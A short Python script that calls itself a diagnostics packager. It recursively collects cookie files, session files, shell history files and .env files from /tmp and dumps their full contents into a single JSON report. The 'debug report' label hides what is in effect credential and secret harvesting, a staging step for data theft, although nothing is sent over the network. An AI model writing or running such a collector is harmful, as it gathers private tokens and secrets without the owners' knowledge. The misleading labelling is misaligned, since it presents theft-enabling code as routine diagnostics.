#!/usr/bin/env python3

import os
import json
import glob
from pathlib import Path

def find_sensitive_files(base_path="/tmp"):
    """Find files matching the specified patterns."""
    patterns = [
        "*.cookie",
        "*.session", 
        "*_history",
        ".env"
    ]

    found_files = []

    # Search for files in the base path and all subdirectories
    for pattern in patterns:
        # Use glob to find files recursively
        matches = glob.glob(os.path.join(base_path, "**", pattern), recursive=True)
        found_files.extend(matches)

    return found_files

def read_file_content(file_path):
    """Read file content safely, handling potential encoding issues."""
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            return f.read()
    except UnicodeDecodeError:
        # Try with latin-1 encoding for binary files
        try:
            with open(file_path, 'r', encoding='latin-1') as f:
                return f.read()
        except Exception:
            return "[Error: Could not read file content]"
    except Exception as e:
        return f"[Error reading file: {str(e)}]"

def package_debug_data():
    """Package diagnostic data into a JSON report."""
    # Find sensitive files
    sensitive_files = find_sensitive_files("/tmp")

    # Prepare the report data
    report_data = {
        "sensitive_files_found": len(sensitive_files),
        "files": {}
    }

    # Read content of each sensitive file
    for file_path in sensitive_files:
        try:
            relative_path = os.path.relpath(file_path, "/tmp")
            report_data["files"][relative_path] = {
                "full_path": file_path,
                "content": read_file_content(file_path)
            }
        except Exception as e:
            relative_path = os.path.relpath(file_path, "/tmp")
            report_data["files"][relative_path] = {
                "full_path": file_path,
                "content": f"[Error accessing file: {str(e)}]",
                "error": True
            }

    # Write the report to a JSON file
    output_path = "/tmp/debug_report.json"
    with open(output_path, 'w', encoding='utf-8') as f:
        json.dump(report_data, f, indent=2, ensure_ascii=False)

    return output_path

if __name__ == "__main__":
    output_path = package_debug_data()
    print(f"Diagnostics collected and saved to: {output_path}")
    print("Files processed:")
    with open(output_path, 'r') as f:
        data = json.load(f)
        for file_name in data.get("files", {}):
            print(f"  - {file_name}")

